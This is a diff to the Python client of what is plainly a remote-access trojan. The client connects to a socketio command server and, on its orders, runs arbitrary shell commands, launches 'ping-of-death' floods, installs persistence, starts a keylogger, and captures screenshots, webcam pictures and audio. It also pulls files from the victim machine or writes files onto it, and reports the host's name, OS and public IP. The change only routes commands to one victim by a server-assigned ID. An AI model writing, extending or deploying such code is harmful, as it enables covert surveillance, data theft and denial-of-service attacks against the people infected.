@@ -8,6 +8,7 @@ server_ip = 'localhost'
 server_port = 8000
 info = {}
 client = socketio.Client()
+device_id = None
 
 persistenceVariable = False
 keyloggerVaraible = False
@@ -114,45 +115,47 @@ def handle_ping(ping):
     idNumber = ping.get('idNumber')
     command = ping.get('command')
     ip_address = ping.get('ip_address')
-    try:
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        while True:
-            line = process.stdout.readline().strip() if process else None
-            if not line:
-                time.sleep(0.1)
-                continue
-            if f'Reply from {ip_address}: bytes=65500 time<1ms TTL=128' in line:
-                output = "PING-OF-DEATH Command Executed Successfully"
-                client.emit('ping_output', {'idNumber': idNumber, 'target': ip_address, 'output': output})
-                break
-            elif f'Reply from {ip_address}: Destination host unreachable.' in line:
-                output = "ERROR : Destination host unreachable."
-                client.emit('ping_output', {'idNumber': idNumber, 'target': ip_address, 'output': output})
-                break
-            elif f'Unknown host' in line:
-                output = "ERROR : Unknown host."
-                client.emit('ping_output', {'idNumber': idNumber, 'target': ip_address, 'output': output})
-                break
-    except Exception as e:
-        error_message = str(e)
-        client.emit('ping_output', {'idNumber': idNumber, 'output': f"ERROR: {error_message}"})
+    if idNumber == device_id:
+        try:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            while True:
+                line = process.stdout.readline().strip() if process else None
+                if not line:
+                    time.sleep(0.1)
+                    continue
+                if f'Reply from {ip_address}: bytes=65500 time<1ms TTL=128' in line:
+                    output = "PING-OF-DEATH Command Executed Successfully"
+                    client.emit('ping_output', {'idNumber': idNumber, 'target': ip_address, 'output': output})
+                    break
+                elif f'Reply from {ip_address}: Destination host unreachable.' in line:
+                    output = "ERROR : Destination host unreachable."
+                    client.emit('ping_output', {'idNumber': idNumber, 'target': ip_address, 'output': output})
+                    break
+                elif f'Unknown host' in line:
+                    output = "ERROR : Unknown host."
+                    client.emit('ping_output', {'idNumber': idNumber, 'target': ip_address, 'output': output})
+                    break
+        except Exception as e:
+            error_message = str(e)
+            client.emit('ping_output', {'idNumber': idNumber, 'output': f"ERROR: {error_message}"})
 
 @client.on('commands')
 def handle_commands(commands):
     idNumber = commands.get('idNumber')
     command = commands.get('command')
     hostname = commands.get('hostname')
-    try:
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        output, error = process.communicate()
-        output_str = output.decode('utf-8').strip()
-        error_str = error.decode('utf-8').strip()
-        if error_str:
-            client.emit('commands_output', {'idNumber': idNumber, 'command': command, 'hostname': hostname, 'output' : error_str})
-        else:
-            client.emit('commands_output', {'idNumber': idNumber, 'command': command, 'hostname': hostname, 'output' : output_str})
-    except Exception as e:
-        return f"ERROR: {str(e)}"
+    if idNumber == device_id:
+        try:
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output, error = process.communicate()
+            output_str = output.decode('utf-8').strip()
+            error_str = error.decode('utf-8').strip()
+            if error_str:
+                client.emit('commands_output', {'idNumber': idNumber, 'command': command, 'hostname': hostname, 'output' : error_str})
+            else:
+                client.emit('commands_output', {'idNumber': idNumber, 'command': command, 'hostname': hostname, 'output' : output_str})
+        except Exception as e:
+            return f"ERROR: {str(e)}"
 
 @client.on("module")
 def message(module):
@@ -160,63 +163,63 @@ def message(module):
     idNumber = module.get('idNumber')
     command = module.get('command')
     hostname = module.get('hostname')
-
-    try:
-        if command == 'persistence':
-            if not persistenceVariable:
-                if try_persistence():
-                    persistenceVariable = True
-                    result = "SUCCESS : Persistence Key Has Been Added"
+    if idNumber == device_id:
+        try:
+            if command == 'persistence':
+                if not persistenceVariable:
+                    if try_persistence():
+                        persistenceVariable = True
+                        result = "SUCCESS : Persistence Key Has Been Added"
+                        client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+                    else:
+                        result = "FAILED : Persistence Key Could Not be Added"
+                        client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+                else:
+                    result = "RETRY : Persistence Key Already Added"
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+            elif command == 'screenshot':
+                screenshot_pic = take_screenshot(idNumber,command,hostname)
+                if isinstance(screenshot_pic, str):
+                    result = f"SUCCESS : Screenshot Has Been Captured"
                     client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
                 else:
-                    result = "FAILED : Persistence Key Could Not be Added"
+                    result = f"FAILED : Screenshot Could not be Captured"
                     client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-            else:
-                result = "RETRY : Persistence Key Already Added"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-        elif command == 'screenshot':
-            screenshot_pic = take_screenshot(idNumber,command,hostname)
-            if isinstance(screenshot_pic, str):
-                result = f"SUCCESS : Screenshot Has Been Captured"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-            else:
-                result = f"FAILED : Screenshot Could not be Captured"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-        elif command == 'keylogger':
-            if not keyloggerVaraible:
-                listener = keyboard.Listener(on_press=start_keylogger)
-                listener.start()
-                keyloggerVaraible = True
-                result = "SUCCESS : Keylogger has been started"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-            elif keyloggerVaraible:
-                result = "RETRY : Keylogger has Already been started"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-            else:
-                result = "FAILED : Keylogger Could not be started"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-        elif command == 'picture':
-            picture_file = take_picture(idNumber, command, hostname)
-            if isinstance(picture_file, str):
-                result = f"SUCCESS : Picture Has been captured"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-            elif isinstance(take_picture, None):
-                result = "ERROR : Could not open WEBCAM (Maybe It doesn't Exist)"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-            else:
-                result = f"FAILED : Picture Could not be captured"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-        elif command == 'audio':
-            audio_file = record_audio(idNumber, command, hostname)
-            if isinstance(audio_file, str):
-                result = f"SUCCESS : Audio Has been Recorded"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-            else:
-                result = f"FAILED : Audio Could not be recorded"
-                client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
-    except Exception as e:
-        result = str(e)
-        client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': "EXCEPTION", 'result': result})
+            elif command == 'keylogger':
+                if not keyloggerVaraible:
+                    listener = keyboard.Listener(on_press=start_keylogger)
+                    listener.start()
+                    keyloggerVaraible = True
+                    result = "SUCCESS : Keylogger has been started"
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+                elif keyloggerVaraible:
+                    result = "RETRY : Keylogger has Already been started"
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+                else:
+                    result = "FAILED : Keylogger Could not be started"
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+            elif command == 'picture':
+                picture_file = take_picture(idNumber, command, hostname)
+                if isinstance(picture_file, str):
+                    result = f"SUCCESS : Picture Has been captured"
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+                elif isinstance(take_picture, None):
+                    result = "ERROR : Could not open WEBCAM (Maybe It doesn't Exist)"
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+                else:
+                    result = f"FAILED : Picture Could not be captured"
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+            elif command == 'audio':
+                audio_file = record_audio(idNumber, command, hostname)
+                if isinstance(audio_file, str):
+                    result = f"SUCCESS : Audio Has been Recorded"
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+                else:
+                    result = f"FAILED : Audio Could not be recorded"
+                    client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': command, 'result': result})
+        except Exception as e:
+            result = str(e)
+            client.emit('module_output', {'idNumber': idNumber, 'hostname': hostname, 'command': "EXCEPTION", 'result': result})
 
 @client.on('download')
 def upload(input):
@@ -224,14 +227,15 @@ def upload(input):
     transfer_type = input.get('transfer_type')
     hostname = input.get('hostname')
     file_name = input.get('file_name')
-    if transfer_type == 'download':
-        try:
-            with open(f'{file_name}', 'rb') as file:
-                file_data = file.read()
-            client.emit('download_from_client', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
-        except:
-            file_data = "File Could not be Read from Client"
-            client.emit('download_from_client', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
+    if idNumber == device_id:
+        if transfer_type == 'download':
+            try:
+                with open(f'{file_name}', 'rb') as file:
+                    file_data = file.read()
+                client.emit('download_from_client', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
+            except:
+                file_data = "File Could not be Read from Client"
+                client.emit('download_from_client', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'file_data' : file_data})
 
 @client.on('upload')
 def download(input):
@@ -240,18 +244,18 @@ def download(input):
     hostname = input.get('hostname')
     file_name = input.get('file_name')
     file_data = input.get('file_data')
-    if transfer_type == 'upload':
-        try:
-            with open(file_name, 'wb') as file:
-                file.write(file_data)
-                status = "File Has Been Uploaded SuccessFully to the Client"
-            client.emit('file_status', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
-        except:
-            status = "File Could not be Uploaded to the Client"
-            client.emit('file_status', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
+    if idNumber == device_id:
+        if transfer_type == 'upload':
+            try:
+                with open(file_name, 'wb') as file:
+                    file.write(file_data)
+                    status = "File Has Been Uploaded SuccessFully to the Client"
+                client.emit('file_status', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
+            except:
+                status = "File Could not be Uploaded to the Client"
+                client.emit('file_status', {'idNumber': idNumber, 'transfer_type': transfer_type, 'hostname' : hostname, 'file_name': file_name, 'status' : status})
 
 info['COMMAND'] = 'INFO'
-info["idNumber"] = str(uuid.uuid4())
 info["hostname"] = socket.gethostname()
 info["OS"] = platform.platform()
 info["IP"] = requests.get('https://api.ipify.org').text
@@ -266,6 +270,11 @@ def connect():
 @client.event
 def disconnect():
     print('CLIENT PAINFULLY DISCONNECTED FROM THE SERVER ❌')
+
+@client.on("idNumber")
+def handle_idNumber(data):
+    global device_id
+    device_id = data.get("idNumber")
 
 print(f"CONNECTING TO THE SERVER {server_ip}:{server_port} ⏳ ")
 client.connect(f'http://{server_ip}:{server_port}')
